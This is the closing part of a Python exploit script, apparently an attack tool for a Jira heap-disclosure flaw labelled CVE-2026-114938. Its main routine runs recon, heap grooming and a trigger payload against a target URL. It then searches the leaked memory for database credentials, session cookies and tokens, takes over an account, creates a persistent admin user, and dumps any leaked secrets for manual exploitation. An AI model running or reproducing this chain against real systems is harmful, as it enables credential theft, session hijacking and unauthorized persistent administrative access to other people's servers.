    parser.add_argument("--attempts", type=int, default=24,
                        help="Max groom attempts (default: 24)")
    parser.add_argument("--spray", type=int, default=GROOM_SPRAY_SIZE,
                        help="Connections per spray (default: 40)")
    parser.add_argument("--username", default="java4shell-admin",
                        help="Admin username to create "
                             "(default: java4shell-admin)")
    parser.add_argument("--jdk17", action="store_true",
                        help="Use JDK 17 trigger (129-byte payload)")
    args = parser.parse_args()

    creds_b64 = base64.b64encode(args.creds.encode()).decode()
    trigger_b64 = TRIGGER_B64_JDK17 if args.jdk17 else TRIGGER_B64
    timer = Timer()

    # ── Banner ──
    print()
    print(f"  {CYAN}╔═══════════════════════════════════════════════════════════╗{NC}")
    print(f"  {CYAN}║  Java4Shell Jira Chain — CVE-2026-114938                  ║{NC}")
    print(f"  {CYAN}║  RECON > WARM > GROOM > JAVABLEED > TAKEOVER > ADMIN      ║{NC}")
    print(f"  {CYAN}╚═══════════════════════════════════════════════════════════╝{NC}")
    print()
    print(f"  {WHITE}JIRA  //  {args.url}{NC}")
    print(f"  {DIM}SPRAY   {args.spray} x {args.attempts} attempts{NC}")
    if args.jdk17:
        print(f"  {YELLOW}TRIGGER JDK 17 mode (129-byte payload){NC}")
    print()

    milestones = {
        "db_creds": False,
        "session_hijack": False,
        "admin_access": False,
        "persistence": False,
    }

    # ── Phase 1: RECON ──
    jira_info = phase_recon(timer, args.url)
    if not jira_info:
        timer.log("!", "Jira not reachable")
        return

    # ── Phase 2: WARM ──
    warm_ok, warm_rtts = phase_warm(timer, args.url, creds_b64,
                                     args.warmup)
    if warm_ok == 0:
        timer.log("!", "Warmup failed — check credentials")
        return

    # ── Phase 3: REHEARSE ──
    rehearsal_rtts = phase_rehearse(timer, args.url, creds_b64)
    avg_rtt = (sum(rehearsal_rtts) / len(rehearsal_rtts)
               if rehearsal_rtts else 1.0)

    # ── Phase 4+5: GROOM + TRIGGER ──
    leaked_data = phase_groom_trigger(
        timer, args.url, creds_b64,
        spray_size=args.spray,
        max_attempts=args.attempts,
        avg_rtt_ms=avg_rtt,
        trigger_b64=trigger_b64)

    if not leaked_data:
        timer.log("~", "No heap disclosure achieved")
        timer.log("~", "Possible causes:")
        timer.log("~", "  - CPU lacks AVX-512 VBMI (required)")
        timer.log("~", "  - JDK is patched")
        timer.log("~", "  - Heap layout never aligned "
                       "(increase --attempts)")
        _print_summary(timer, milestones)
        return

    # ── Phase 6: JAVABLEED ──
    secrets = find_jira_secrets(timer, leaked_data)

    if secrets.get("db_creds"):
        milestones["db_creds"] = True
    if secrets.get("session_cookies") or secrets.get("crowd_tokens"):
        milestones["session_hijack"] = True

    total_secrets = sum(len(v) for v in secrets.values())
    if total_secrets == 0:
        timer.log("~", "No exploitable secrets found in leaked data")
        _print_summary(timer, milestones)
        return

    # ── Phase 7: TAKEOVER ──
    access = phase_takeover(timer, args.url, secrets, creds_b64)

    if access:
        milestones["admin_access"] = True
        timer.log("+", f"{GREEN}Admin access via {access['method']}{NC} "
                       f"— user '{access['user']}'")

        # ── Phase 8: ADMIN ──
        admin_ok = phase_admin(timer, args.url, access, args.username)
        if admin_ok:
            milestones["persistence"] = True
    else:
        timer.log("~", "Could not gain direct admin access")
        timer.log("~", "Leaked secrets dumped for manual exploitation:")
        for cat, items in secrets.items():
            if items:
                for item in items[:3]:
                    val = (item.get("key_hex", "") or
                           item.get("value", "") or
                           item.get("url", "") or "")
                    timer.log("~", f"  [{cat}] {val[:64]}...")

    _print_summary(timer, milestones)


def _print_summary(timer, milestones):
    elapsed = timer.elapsed()

    print()
    access_level = "NONE"
    if milestones["persistence"]:
        access_level = "ADMIN + PERSISTENCE"
    elif milestones["admin_access"]:
        access_level = "ADMIN"
    elif milestones["session_hijack"]:
        access_level = "SESSION"
    elif milestones["db_creds"]:
        access_level = "DB CREDENTIALS"

    print(f"  ELAPSED   {timer.fmt(elapsed)}"
          f"          ACCESS  {access_level}")
    print(f"  ATTEMPTS  {timer.try_count:02d}")
    print()

    def ms(label, done):
        return (f"{GREEN}■ {label}{NC}" if done
                else f"{DIM}□ {label}{NC}")

    print(f"  {ms('DB CREDS', milestones['db_creds'])}    "
          f"{ms('SESSION HIJACK', milestones['session_hijack'])}    "
          f"{ms('ADMIN ACCESS', milestones['admin_access'])}    "
          f"{ms('PERSISTENCE', milestones['persistence'])}")
    print()


if __name__ == "__main__":
    main()
